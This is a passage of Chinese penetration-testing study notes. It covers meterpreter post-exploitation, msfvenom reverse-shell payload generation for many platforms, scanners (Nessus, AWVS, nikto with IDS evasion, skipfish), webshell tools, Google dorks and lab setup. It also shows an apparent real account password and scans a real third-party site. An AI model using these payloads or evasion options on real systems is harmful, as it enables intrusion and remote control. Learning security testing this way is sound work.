
```shell
在上述步骤中拿到meterpreter后，执行相关命令，如：
run post/windows/gather/arp_scanner RHOST=192.168.1.0/24
来让受控肉鸡帮助我们进行系统扫描，以免自身被发现。如：
run post/multi/recon/local_exploit_suggester (寻找受控机器还有什么漏洞)

...
```

### 2.19.5 其他端的生成方式

```shell
安卓app:

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.10.27 LPORT=8888 -o ~/Desktop/test2.apk

Linux:

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.10.27 LPORT=8888 -f  elf > shell.elf

Mac:

msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.10.27 LPORT=8888 -f macho >  shell.macho

PHP：

msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.20.27 LPORT=4444 -f raw -o test.php

ASP:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.27 LPORT=8888  -f asp > shell.asp

ASPX：

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.27 LPORT=8888  -f  aspx > shell.aspx

JSP:

msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.10.27 LPORT=8888 -f  raw > shell.jsp

Bash：

msfvenom -p cmd/unix/reverse_bash LHOST=192.168.10.27 LPORT=8888 -f   raw > shell.sh

Perl

msfvenom -p cmd/unix/reverse_perl LHOST=192.168.10.27 LPORT=8888 -f raw > shell.pl

Python

msfvenom -p python/meterpreter/reverser_tcp LHOST=192.168.10.27 LPORT=8888 -f   raw > shell.py
```

## 2.20 目录探测

```shell
#dirsearch: 
https://github.com/maurosoria/dirsearch
#dirmap:
https://github.com/H4ckForJob/dirmap
#御剑后台扫描工具
```

## 2.21 nessus

```shell
1998年，Nessus的创办人Renaud Deraison展开了一项名为"Nessus"的计划，
目的是希望能为互联网社群提供一个免费、威力强大、更新频繁并简易使用的远端系统安全扫描程式。
2002年时，Renaud与Ron Gula, Jack Huffard 创办了一个名为Tenable Network Security机构。
在第三版的Nessus释出之时，该机构收回了Nessus的版权与程式源代码（原本为开放源代码)，
并注册了nessus.org成为该机构的网站。目前此机构位于美国马里兰州的哥伦比亚。

实验环境:
因为NESSUS占用内存比较大，做这个实验需要将Kali内存调到6G或8G。

#下载地址
https://www.tenable.com/downloads/nessus

#领取一个激活码
https://zh-cn.tenable.com/products/nessus/nessus-essentials?tns_redirect=true

#解压

#安装
windows系统：双击Nessus安装包，一路下一步
linux系统：dpkg -i Nessus-****.ded
#选择版本
Nessus Essentials 免费版
Nessus Professional 专业版
Nessus Manager 管理台
Managed Scanner 扫描器
#输入激活码(见outlook邮箱) + 创建管理账号(suxin1932/Zx20221001)
#下载插件 +初始化
注意：此过程需保证网络同通信稳定如果失败，进入后台执行以下命令：
/opt/nessus/sbin/nessuscli update --al

#下载完毕后重启nessus服务
输入Nessus登录用户名密码，安装完毕

#管理Nessus服务
windows：
1、win + r 输入services.msc，找到Tenable Nessus服务，可进行启动、停止、重启操作
2、cmd 输入 net stop “Tenable Nessus” ，net start“Tenable Nessus”
linux：
1、systemctl start nessusd ，service nessusd start
2、systemctl stop nesssusd ，service nessusd stop

#访问
https://localhost:8834
```

## 2.22 AWVS(Acunetix Web Vulnerability Scanner)

```shell
#概述
Acunetix Web Vulnerability Scanner(简称AWVS）是一款知名的网络漏洞扫描工具，
它通过网络爬虫测试你的网站安全，检测流行安全漏洞。
是一个自动化的Web应用程序安全测试工具，
它可以扫描任何可通过Web浏览器访问的和遵循HTTP/HTTPS规则的Web站点和Web应用程序。
适用于任何中小型和大型企业的内联网、外延网和面向客户、雇员、厂商和其它人员的Web网站。
AWVS可以通过检查SQL 注入攻击漏洞、跨站脚本攻击漏洞等来审核Web应用程序的安全性。
它可以扫描任何可通过Web浏览器访问的和遵循HTTP/HTTPS 规则的Web站点和Web应用程序。
从11.0版本开始，AWVS就变成了使用浏览器端打开的形式，使用安装时自定义的端口来访问。


#功能
√ WebScanner :核心功能，web安全漏洞扫描(深度，宽度，限制20个)
√ Site Crawler:爬虫功能，遍历站点目录结构
√ Target Finder:端口扫描，找出web服务器(80、443)
√ Subdomian Scanner子域名扫描器，利用DNS查询
√ Blind SQL Injector :盲注工具
√ Http Editor http:协议数据包编辑器
√ HTTP Sniffer : HTTP协议嗅探器(fiddler，wireshark,bp)
√ HTTP Fuzzer:模糊测试工具(bp)
√ Authentication Tester : Web认证破解工具
```

## 2.22 nikto漏洞扫描(kali自带)

```shell
Nikto是一款开源的(GPL)网页服务器扫描器，它可以对网页服务器进行全面的多种扫描，
包含:
超过3300种有潜在危险的文件CGls;
超过625种服务器版本;
超过230种特定服务器问题。

#使用方式：
1.扫描单个主机
nikto -host https://worldwide.espacenet.com/
2.批量扫描并将扫描结果保存至 /tmp/1.txt下
nikto -host my-hosts.txt(其中my-hosts.txt中的各个主机换行展示) -output /tmp/1.txt
3.扫描内网开放80端口的IP.
-oG 表示把扫描的结果输出，同时过虑扫描成功的IP,
-表示输出的结果
nmap -p80 192.168.13.0/24 -oG - | nikto -host-

4.-evasion
#使用 LibWhisker 中对 IDS 的躲避技术，可使用以下几种类型
1随机URL编码(非 UTF-8方式)·
2自选择路径(/./)
3过早结束的URL
4优先考虑长随机字符串
5参数欺骗
6使用 TAB 作为命令的分隔符
7使用变化的URL
8使用Windows路径分隔符"\"
nikto -host https://worldwide.espacenet.com/ -evasion 1234

#扩展
入侵检测系统(intrusion detection system，简称“IDS”）
是一种对网络传输进行即时监视，
在发现可疑传输时发出警报或者采取主动反应措施的网络安全设备。
它与其他网络安全设备的不同之处便在于，IDS是一种积极主动的安全防护技术。
```

## 2.23 skipfish漏洞扫描工具



[kali linux Web渗透扫描工具：nikto、skipfish_忘_忧的博客-CSDN博客_kali web扫描工具](https://blog.csdn.net/m0_47053270/article/details/119812440)



```shell
Skipfish简介谷歌创建的Web应用程序安全扫描程序,是一种活跃的Web应用程序安全侦察工具。
它通过执行递归爬网和基于字典的探针为目标站点准备交互式站点地图。
然后使用许多活动（但希望无中断）安全检查的输出对结果映射进行注释。
该工具生成的最终报告旨在作为专业 Web应用程序安全评估的基础。
#特点:
高速:
纯C代码，高度优化的HTTP处理，最小的CPU占用空间·通过响应式目标轻松实现每秒2000个请求;
易于使用∶
启发式支持各种古怪的 Web框架和混合技术站点，具有自动学习功能，动态词表创建和表单自动完成;
尖端的安全逻辑:
高质量，低误报，差异安全检查，能够发现一系列微妙的缺陷，包括盲注射矢量。

1.扫描网站并保存到某个文件夹下(比如/opt/skipfish_files/s1，结果文件最终是html文件)
skipfish -o s1 https://worldwide.espacenet.com/
查看扫描结果的方式是：在kali中打开浏览器，输入下述链接即可查看
file:///opt/skipfish_files/s1/index.html

2.批量扫描文件里面的网站(其中source.txt里面是网站地址，换行展示)
skipfish -o s2 @source.txt

3.扫描dvwa靶场示例
skipfish -o s2 --auth-form http://10.102.224.206:9093/login.php --auth-user-field username --auth-user admin --auth-pass-field password --auth-pass password http://10.102.224.206:9093



```

## 2.24 中国蚁剑(antSword)

```shell
#加载器
https://github.com/AntSwordProject/AntSword-Loader
#核心模块
https://github.com/AntSwordProject/antSword
#后门
https://github.com/AntSwordProject/AwesomeScript
```

## 2.25 星链计划

```shell
https://github.com/knownsec/404StarLink
```



## 2.26 DNS 工具

```
https://rapiddns.io/
```





# 3.浏览器or插件

## 3.1 google

```
使用Google等搜索引擎可以对某些特定的网络(主机服务器)，通常是服务器上的脚本漏洞，进行搜索。以达到快速找到漏洞主机或特定的主句的漏洞的目的。Google搜索引擎毫无疑问是当今世界上最强大的搜索引擎。
```

```
关键词:
>> inurl
inurl 用于搜索网页上包好的URL，这个语法对于寻找网页上的搜素、帮助之类的是很好用的。

>> intext
intext只搜索网页部分中包含的文字(忽略了标题URL等的文字)

>> site
site 可以限制你搜索范围的域名

>> filetype
filetype搜索文件的后缀名或扩展名

>> intitle
intitle 限制你搜索的网页标题

>> allintitle
allintitle 搜索所有关键字构成标题的网页，但是推荐尽量少用。

>> link
link可以得到一个包含指定某个URL的页面列表.

例子:
1.link:www.google.com, 可以查询所有链接到谷歌的页面列表
2.site:www.google.com filetype:xls
3.site:www.google.com admin
4.site:www.google.com login
5.site:www.google.com system
6.site:www.google.com 管理
7.site:www.google.com email
8.intext:管理
9.filetype:mdb
10.site:www.google.com filetype:jsp qq
11.site:www.google.com filetype:jsp?id=
12.site:tw www.google.com inurl:file
```

## 3.2 HackBar

```
HackBarV2
firefox从扩展中获取此插件后, F12即可看到HackBar
```

https://www.fujieace.com/hacker/tools/hackbar.html

## 3.3 shodan

https://www.shodan.io/

## 3.4 fofa

https://fofa.info/

https://*fofa*.so/

# 97.常见方式

```
msf上可以制作一个网页木马A4
```

# 98.常见靶场环境安装

```python
如果部署后docker ps发现进程已经启动，但外部无法访问,且type是Ipv6

1.当主机拥有多于一块的网卡时，其中一块收到数据包，
根据数据包的目的ip地址将数据包发往本机另一块网卡，该网卡根据路由表继续发送数据包。
这通常是路由器所要实现的功能; 查看一下：
/sbin/sysctl net.ipv4.ip_forward

如果 net.ipv4.ip_forward = 0
说明转发没有打开

2.永久修改 net.ipv4.ip_forward
vi /etc/sysctl.conf
net.ipv4.ip_forward = 1

3.保存后，sysctl -p 重启生效即可
```

## 98.1 bwapp靶场

    1.docker模板机(如安装了docker的centos7)关机状态下, 克隆一台DVWA的机器
    2.root用户登录机器
    hostnamectl set-hostname dvwa
    3.退出系统--重新登陆
    4.执行docker version看下是否客户端和服务端都启动了
    5.docker search bwapp
    6.docker pull raesene/bwapp
    7.docker images (获取镜像id)
    8.docker run -it -d -p 8080:80 镜像id
    9.http://ip:8080/install.php
    账号是 bee 密码是 bug

## 98.2 Pikachu靶场

    1.docker模板机(如安装了docker的centos7)关机状态下, 克隆一台pikachu的机器
    2.root用户登录机器
    hostnamectl set-hostname pikachu
    3.退出系统--重新登陆
    4.执行docker version看下是否客户端和服务端都启动了
    5.下载代码到本地
    https://github.com/zhuifengshaonianhanlu/pikachu
    6.cd pikachu目录, 该目录下有一个 Dockerfile 文件用于构建镜像
    7.执行命令构建镜像(后面有个点)docker build -t pikachu .
    8.docker run -d -p 9092:80 pikachu的镜像pid
    9.浏览器输入 http//ip:9092

## 98.3 DVWA靶场

    1.docker模板机(如安装了docker的centos7)关机状态下, 克隆一台DVWA的机器
    2.root用户登录机器
    hostnamectl set-hostname dvwa
    3.退出系统--重新登陆
    4.执行docker version看下是否客户端和服务端都启动了
    5.docker pull vulnerables/web-dvwa
    6.docker images查看镜像是否下载成功
    6.docker run -d -p 9093:80 -p 3306:3306 -e MYSQL_PASS="password" 镜像的pid (必须是80端口)
    7.打开浏览器访问: http://ip:9093
    用户名: admin, 密码是刚才设置的密码:password
    8.划到最下方，点击create/reset，等待即可，如果跳转成功，则表明成功

## 98.4 sqli-labs靶场

```she

```

# 99.常见资源

## 99.1 国家信息安全漏洞库

    http://www.cnnvd.org.cn/index.html
    https://www.cnvd.org.cn/

## 99.2 国家企业信用信息公示系统

    https://www.gsxt.gov.cn/index.html

## 99.3 各大厂商安全中心

```shell
#小米信息安全中心
https://sec.xiaomi.com/#/

#工控系统安全漏洞平台
http://ivd.winicssec.com/

#教育行业安全漏洞平台
https://src.sjtu.edu.cn/

#华为安全中心平台
https://isecurity.huawei.com/sec/web/urlClassification.do

#漏洞银行
https://www.bugbank.cn/

#360威胁情报中心
https://ti.360.net
https://zhongce.360.net/

#钟馗之眼
https://www.zoomeye.org/

#微步在线
https://www.threatbook.cn/

google

#百度安全
https://anquan.baidu.com/

#春秋
https://www.ichunqiu.com

#字节跳动安全中心
https://security.bytedance.com/

#蚂蚁金服
https://security.alipay.com/

#瓜子
https://security.guazi.com/home

#绿盟科技
http://www.nsfocus.net
https://www.nsfocus.com.cn/

#安全客
https://www.anquanke.com/

其他安全中心
大厂商
互联网
金融
游戏
```

## 99.4 国外漏洞平台

```shell
https://www.hackerone.com/
https://www.0day.today/
http://routerpwn.com/
#赛门铁克的漏洞库(国际权威漏洞库)
http://www.securityfocus.com
#CVE常见漏洞和披露
https://cve.mitre.org/
#信息安全漏洞门户
http://vulhub.org.cn/index
#美国著名安全公司Offensive Security的漏洞库[比较及时]
http://www.exploit-db.com
#信息安全漏洞门户
http://www.scap.org.cn/
http://vulhub.org.cn/index
#知道创宇漏洞库
https://www.seebug.org/
#美国国家信息安全漏洞库
https://nvd.nist.gov/
#俄罗斯知名安全实验室
https://www.securitylab.ru/vulnerability/
```

## 99.5 国家政府法律法规网站

```python
等级保护
http://www.djbh.net/webdev/web/HomeWebAction.do?p=init
    
安全测评认证考试
中国信息安全测评中心(里面有官方认证的授权培训中心，每年都会变化)
http://www.itsec.gov.cn/
```

## 99.6 其他

```
被黑站点统计
https://www.hacked.com.cn/

黑客工具排行榜
https://sectools.org/

抓包工具
wireshark
fiddler

metaspliot

无线网络攻击测试攻击
aircrack

https://www.wangan.com/
```

## 99.7 CVE

```shell
CVE的英文全称是"Common Vulnerabilities & Exposures"公共漏洞和暴露。
CVE就好像是一个查看公共漏洞的字典。

随着全球范围的黑客入侵不断猖獗，信息安全问题越来越严重。
在对抗黑客入侵的安全技术中，实时入侵检测和漏洞扫描评估
(IDnA-—Intrusion Detection and Assessment)的技术和产品已经开始占据越来越重要的位置。
Intrusion Detection and Assessment(入侵检测与评估)

1.
```

# 100.make money

```
>> 参加护网行动
>> 参加阿里云安全比赛, 有奖金
>> 提交漏洞, 有钱
>> SRC 战队
>> 国内安全平台 https://www.anquanke.com/src
```
